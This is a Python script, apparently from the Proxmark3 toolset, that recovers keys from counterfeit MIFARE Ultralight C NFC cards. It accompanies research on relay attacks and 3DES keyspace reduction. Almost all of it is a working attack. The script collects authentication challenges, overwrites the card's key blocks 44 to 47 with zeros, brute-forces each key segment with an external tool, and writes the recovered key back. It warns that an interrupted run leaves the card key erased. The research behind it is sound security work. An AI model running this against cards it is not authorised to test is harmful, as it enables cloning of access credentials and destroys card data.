#!/usr/bin/env python3

# Key recovery for Giantec ULCG and USCUID-UL cards (won't work on NXP cards!)
#
# Conditions:
# * AUTH0 allowing unauthenticated writes to key blocks, e.g. by completing a relay attack in UNLOCK mode
#
# noproto & doegox, 2025
# cf "BREAKMEIFYOUCAN!: Exploiting Keyspace Reduction and Relay Attacks in 3DES and AES-protected NFC Technologies"
# for more info

import subprocess
import argparse
import random
import sys
import threading
import time
import queue
import json
import signal
import traceback
import math
from queue import Queue
from typing import Optional, Set
from pm3_resources import find_tool


required_version = (3, 8)
if sys.version_info < required_version:
    print(f"Python version: {sys.version}")
    print(f"The script needs at least Python v{required_version[0]}.{required_version[1]}. Abort.")
    exit()

tools = {
    "mfulc_des_brute": find_tool("mfulc_des_brute"),
}


class CrackEffect:
    """
    A class to create a visual effect of cracking blocks of data.

    Attributes:
        num_blocks (int): Number of blocks to display.
        block_size (int): Size of each block in characters.
        scramble_delay (float): Delay between each scramble update in seconds.
        message_queue (Queue): Queue to handle cracked blocks.
        revealed (list): List to store the current state of each block.
        stop_event (threading.Event): Event to signal stopping of threads.
        cracked_blocks (Set[int]): Set of indices of cracked blocks.
        display_lock (threading.Lock): Lock to synchronize display updates.

    Methods:
        generate_random_hex() -> str:
            Generate a random hex string of block_size length.

        format_block(block: str, is_cracked: bool) -> str:
            Format a block with appropriate color based on its state.

        draw_static_box():
            Draw the initial static box.

        print_above(data):
            Print the given data above the box and redraw the box.

        display_current_state():
            Display the current state of all blocks.

        scramble_effect():
            Run the main loop for the scrambling effect.

        process_message_queue():
            Process incoming cracked blocks from the queue.

        add_cracked_block(block_idx: int, text: str):
            Add a cracked block to the message queue.

        start():
            Start the cracking effect.
    """

    def __init__(self, num_blocks: int = 4, block_size: int = 8, scramble_delay: float = 0.01):
        """
        Initialize the CrackEffect class with the given parameters.

        Args:
            num_blocks (int): Number of blocks to display. Default is 4.
            block_size (int): Size of each block in characters. Default is 8.
            scramble_delay (float): Delay between each scramble update in seconds. Default is 0.01.
        """
        self.num_blocks = num_blocks
        self.block_size = block_size
        self.scramble_delay = scramble_delay
        self.message_queue: Queue = Queue()
        self.revealed = [''] * num_blocks
        self.stop_event = threading.Event()
        self.cracked_blocks: Set[int] = set()
        self.display_lock = threading.Lock()
        self.output_enabled = True

    def generate_random_hex(self) -> str:
        """Generate a random hex string of block_size length."""
        hex_chars = '0123456789ABCDEF'
        return ''.join(random.choice(hex_chars) for _ in range(self.block_size))

    def format_block(self, block: str, is_cracked: bool) -> str:
        """Format a block with appropriate color based on its state."""
        if is_cracked:
            return f"\033[1;34m{block}\033[0m"  # Bold blue
        return f"\033[96m{block}\033[0m"  # Bright cyan

    def draw_static_box(self):
        """Draw the initial static box."""
        if not self.output_enabled:
            return
        width = (self.block_size + 1) * self.num_blocks + 4
        print("")  # Add some padding above
        print("╔" + "═" * width + "╗")
        print("║" + " " * width + "║")
        print("║" + " " * width + "║")
        print("║" + " " * width + "║")
        print("╚" + "═" * width + "╝")
        # Move cursor to the middle line
        sys.stdout.write("\033[3A")  # Move up 3 lines to middle row
        sys.stdout.flush()

    def print_above(self, data):
        """Print the given data above the box and redraws the box."""
        if not self.output_enabled:
            print(data)
            return
        with self.display_lock:
            # Move cursor above the box and clean the line
            sys.stdout.write("\033[2A\033[1G\033[K" + data)
            self.draw_static_box()

    def display_current_state(self):
        """Display the current state of all blocks."""
        if not self.output_enabled:
            return
        with self.display_lock:
            formatted_blocks = [
                self.format_block(block, i in self.cracked_blocks)
                for i, block in enumerate(self.revealed)
            ]
            display_text = ' '.join(formatted_blocks)

            # Update only the middle line
            sys.stdout.write(f"\r║  {display_text}   ║")
            sys.stdout.flush()

    def scramble_effect(self):
        """Run the main loop for the scrambling effect."""
        if not self.output_enabled:
            return
        while not self.stop_event.is_set():
            # Update all non-cracked blocks with random values
            for block in range(self.num_blocks):
                if block not in self.cracked_blocks:
                    self.revealed[block] = self.generate_random_hex()

            self.display_current_state()
            time.sleep(self.scramble_delay)

    def erase_key(self):
        """Erase random parts of the key."""
        if not self.output_enabled:
            return
        for block in range(self.num_blocks):
            if block not in self.cracked_blocks:
                self.revealed[block] = '.' * self.block_size
        self.display_current_state()

    def process_message_queue(self):
        """Process incoming cracked blocks from the queue."""
        if not self.output_enabled:
            return
        while not self.stop_event.is_set():
            try:
                block_idx, cracked_text = self.message_queue.get(timeout=0.1)
                self.revealed[block_idx] = cracked_text
                self.cracked_blocks.add(block_idx)
                self.display_current_state()

                # Check if all blocks are cracked
                if len(self.cracked_blocks) == self.num_blocks:
                    self.stop_event.set()
                    print("\n" * 3)  # Add newlines after completion
                    break
            except queue.Empty:
                continue
            except Exception as e:
                print(f"\nError processing message: {e}")
                break

    def add_cracked_block(self, block_idx: int, text: str):
        """Add a cracked block to the message queue."""
        if not 0 <= block_idx < self.num_blocks:
            raise ValueError(f"Block index {block_idx} out of range")
        if len(text) != self.block_size:
            raise ValueError(f"Block text must be {self.block_size} characters")
        self.message_queue.put((block_idx, text))

    def start(self):
        """Start the cracking effect."""
        self.draw_static_box()

        # Create and start the worker threads
        scramble_thread = threading.Thread(target=self.scramble_effect)
        process_thread = threading.Thread(target=self.process_message_queue)

        scramble_thread.daemon = True
        process_thread.daemon = True

        scramble_thread.start()
        process_thread.start()

        # Wait for both threads to complete
        process_thread.join()
        self.stop_event.set()
        scramble_thread.join()


def collect(num_challenges: int, p, debug: bool) -> Optional[dict]:
    """
    Collect challenges from the card and check if it is vulnerable.

    Args:
        num_challenges (int): Number of challenges to collect.
        p: Proxmark3 instance.
        debug (bool): Enable debug mode.

    Returns:
        Optional[dict]: Collected challenges data or None if the card is not vulnerable.
    """
    # Sanity check: make sure an Ultralight C is on the Proxmark
    p.console("hf 14a info")
    if "MIFARE Ultralight C" not in p.grabbed_output:
        print("[-] Error: \033[1;31mUltralight C not placed on Proxmark\033[0m")
        return
    else:
        print("[+] Ultralight C detected. Keep stable on Proxmark during the attack.")

    # Sanity check: ensure card is unlocked and lock bytes do not prevent key overwrite
    p.console("hf 14a raw -sc 3028")
    hex_bytes = p.grabbed_output.split()
    if len(hex_bytes) < 16:
        print("[-] Error: \033[1;31mCard not unlocked. Run relay attack in UNLOCK mode first.\033[0m")
        return
    data_bytes = [bytes.fromhex(b) for b in hex_bytes[1:17]]
    # Byte 0 of page 42: 0x30 minimum
    minimum_auth_page = ord(data_bytes[8])
    if minimum_auth_page < 48:
        print("[-] Error: \033[1;31mCard not unlocked. Run relay attack in UNLOCK mode first.\033[0m")
        return
    # First bit of byte 1 in page 40: lock key
    is_locked_key = ((ord(data_bytes[1]) & 0x80) >> 7) == 1
    if is_locked_key:
        print("[-] Error: \033[1;31mCard is not vulnerable (see READ mode in relay app)\033[0m")
        return

    print("[+] All sanity checks \033[1;32mpassed\033[0m. Checking if card is vulnerable.\033[?25l")

    # Collect challenges (100)
    challenges_collected = 0
    challenges_100 = set()
    challenges = {}
    collision = False

    while challenges_collected < num_challenges:
        p.console("hf 14a raw -sc 1A00")
        challenge = p.grabbed_output.split()
        if (len(challenge) > 8) and (challenge[1] == "AF"):
            hex_challenge = "".join(challenge[2:10])
            if hex_challenge in challenges_100:
                collision = True
                challenges["challenge_100"] = hex_challenge
                break
            else:
                challenges_100.add(hex_challenge)
            challenges_collected += 1

    print("\n[+] 100 collection complete")
    print(f"\r[+] Challenges collected: \033[96m{challenges_collected}\033[0m")
    if collision:
        print("[+] Status: \033[1;31mVulnerable\033[0m\033[?25h")
    else:
        experimental_chals_subset_size = 600
        probability_no_collision = 1.0
        for i in range(challenges_collected):
            probability_no_collision *= (experimental_chals_subset_size - i) / experimental_chals_subset_size
        precision = max(1, -int(math.floor(math.log10(probability_no_collision))) + 1)
        print("[+] Status: \033[1;32mNot vulnerable\033[0m"
              f" (false negative probability: {probability_no_collision*100:.{precision-1}f}%)\033[?25h")
        return

    # The card is vulnerable, proceed with attack
    # Danger zone. To reset a test card, run: hf mfu setkey -k 49454D4B41455242214E4143554F5946

    # Overwrite block 47
    p.console("hf mfu wrbl -b 47 -d 00000000", capture=False, quiet=False)

    # Collect challenges (75)
    p.console("hf 14a raw -sc 1A00")
    challenge = p.grabbed_output.split()
    if (len(challenge) > 8) and (challenge[1] == "AF"):
        hex_challenge = "".join(challenge[2:10])
        challenges["challenge_75"] = hex_challenge
    print("\n[+] 75 collection complete")

    # Overwrite block 46
    p.console("hf mfu wrbl -b 46 -d 00000000", capture=False, quiet=False)

    # Collect challenges (50)
    p.console("hf 14a raw -sc 1A00")
    challenge = p.grabbed_output.split()
    if (len(challenge) > 8) and (challenge[1] == "AF"):
        hex_challenge = "".join(challenge[2:10])
        challenges["challenge_50"] = hex_challenge
    print("\n[+] 50 collection complete")

    # Overwrite block 45
    p.console("hf mfu wrbl -b 45 -d 00000000", capture=False, quiet=False)

    # Collect challenges (25)
    p.console("hf 14a raw -sc 1A00")
    challenge = p.grabbed_output.split()
    if (len(challenge) > 8) and (challenge[1] == "AF"):
        hex_challenge = "".join(challenge[2:10])
        challenges["challenge_25"] = hex_challenge
    print("\n[+] 25 collection complete")

    # Overwrite block 44
    p.console("hf mfu wrbl -b 44 -d 00000000", capture=False, quiet=False)

    # Collect challenges (0)
    p.console("hf 14a raw -sc 1A00")
    challenge = p.grabbed_output.split()
    if (len(challenge) > 8) and (challenge[1] == "AF"):
        hex_challenge = "".join(challenge[2:10])
        challenges["challenge_0"] = hex_challenge
    print("\n[+] 0 collection complete")

    return challenges


def main():
    """
    Key recovery for Giantec ULCG and USCUID-UL cards (won't work on NXP cards!)

    This script collects the necessary challenges either from a Proxmark3 device or from a file, and attempts
    to crack the ULCG/USCUID-UL keys using the collected challenges, with the help of the mfulc_des_brute tool.

    Conditions:
    * AUTH0 must allow unauthenticated writes to key blocks,
      e.g. by completing a relay attack in UNLOCK mode

    Attention points:
    * If the brute-force is interrupted before completion, the card key will be left erased!
    * If saving challenges to a file for offline processing, the card key will also be erased,
      but you will be able to restore it once found.
    * The found key is not *exactly* the original key, because parity bits are lost, but authentication will work.

    Examples:

    - Collect 1000 challenges and use 4 threads for cracking:
          $ pm3 -y 'mfulc_counterfeit_recovery -t 4'
      or, from the client:
          pm3 --> script run mfulc_counterfeit_recovery -t 4

    - Collect 1000 challenges and save them in a file for later offline processing:
          $ pm3 -y 'mfulc_counterfeit_recovery -j challenges.json'
      or, from the client:
          pm3 --> script run mfulc_counterfeit_recovery -j challenges.json

    - Recover key from previously collected challenges (doesn't require the Proxmark3 client):
          $ python3 mfulc_counterfeit_recovery.py -j challenges.json -o -t 4
      or, nevertheless from the client:
          pm3 --> script run mfulc_counterfeit_recovery -j challenges.json -o -t 4
    """
    parser = argparse.ArgumentParser(
        description=main.__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-c', '--challenges', help='Set number of challenges to collect (default:1000)', type=int, default=1000)
    parser.add_argument('-t', '--threads', help='Set number of threads to use for key recovery (default:1)', type=int, default=1)
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('-j', '--json', help='Path to JSON file to load or save collected challenges')
    parser.add_argument('-o', '--offline', action='store_true', help='Use offline mode with pre-collected challenges')
    args = parser.parse_args()
    debug = args.debug
    num_challenges = args.challenges
    offline = args.offline

    if not offline:
        import pm3
        p = pm3.pm3()
        challenges = collect(num_challenges, p, debug)
        if challenges is None:
            return
        if args.json:
            with open(args.json, "w") as f:
                json.dump(challenges, f)
            print(f"[+] Challenges saved to {args.json}.")
            print("[!] Beware that the card key is now erased!")
            return
    else:
        with open(args.json, "r") as f:
            challenges = json.load(f)

    print("[+] Cracking in progress...\033[?25l")

    # Create and start the cracking effect
    crack_effect = CrackEffect()
    # crack_effect.output_enabled = False
    effect_thread = threading.Thread(target=crack_effect.start)
    effect_thread.start()

    def signal_handler(sig, frame):
        print("\n\n\n[!] Interrupt received, stopping...")
        crack_effect.stop_event.set()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    key_segment_values = {0: "00"*4, 1: "00"*4, 2: "00"*4, 3: "00"*4}
    key_found = False

    try:
        ciphertexts = {1: challenges["challenge_25"],
                       0: challenges["challenge_50"],
                       3: challenges["challenge_75"],
                       2: challenges["challenge_100"]}
        for key_segment_idx in [1, 0, 3, 2]:
            ciphertext = ciphertexts[key_segment_idx]
            cmd = [tools["mfulc_des_brute"],
                   "-c",
                   f"{challenges['challenge_0']}",
                   f"{ciphertext}",
                   "".join(key_segment_values.values()),
                   str(key_segment_idx+1),
                   str(args.threads)]
            if debug:
                crack_effect.print_above("[=] CMD:" + ' '.join(cmd))
            start_time = time.time()
            result = subprocess.run(cmd, capture_output=True, text=True)
            end_time = time.time()
            elapsed_time = end_time - start_time
            if debug:
                crack_effect.print_above(f"[=] Tested {ciphertext} in {elapsed_time:.2f}s")
            if "Could not detect LFSR" in result.stderr:
                key_found = False
                crack_effect.stop_event.set()
                crack_effect.erase_key()
                print(f"\n\n\n[-] Error: {result.stderr}")
                break
            if "LFSR detection" in result.stdout:
                if debug:
                    for line in result.stdout.split('\n'):
                        if "LFSR detection" in line:
                            crack_effect.print_above(f"[+] {line}")
            if "No matching key was found" in result.stdout:
                key_found = False
                crack_effect.stop_event.set()
                crack_effect.erase_key()
                print(f"\n\n\n[-] Error: {result.stdout}")
                break
            if "Full key (hex): " not in result.stdout:
                key_found = False
                crack_effect.stop_event.set()
                crack_effect.erase_key()
                print(f"\n\n\n[-] Error: {result}")
                break
            key_segment_values[key_segment_idx] = result.stdout.split("Full key (hex): ")[1][(8*key_segment_idx):][:8]
            if debug:
                crack_effect.print_above(f"[+] Found key segment: {key_segment_values[key_segment_idx]}")
            key_found = True
            crack_effect.add_cracked_block(key_segment_idx, key_segment_values[key_segment_idx])
            continue
    except Exception as e:
        crack_effect.stop_event.set()
        print(f"\n\n\nAn error occurred: {e}")
        if debug:
            traceback.print_exc()
    finally:
        effect_thread.join()

    if key_found:
        result_key = "".join(key_segment_values.values())
        formatted_key = f"\033[1;34m{result_key}\033[0m"
        print(f"[+] Found key: {formatted_key}\033[?25h")
        if offline:
            print("You can restore found key on the card with: "
                  f"hf mfu setkey --key {result_key}")
        else:
            # Restore the key on the card
            # This is not the original key, because parity bits are lost (65536 possible keys), but auth will work
            p.console(f"hf mfu setkey --key {result_key}", capture=False, quiet=True)
            print("\nKey now restored on the card")

    return


if __name__ == '__main__':
    main()
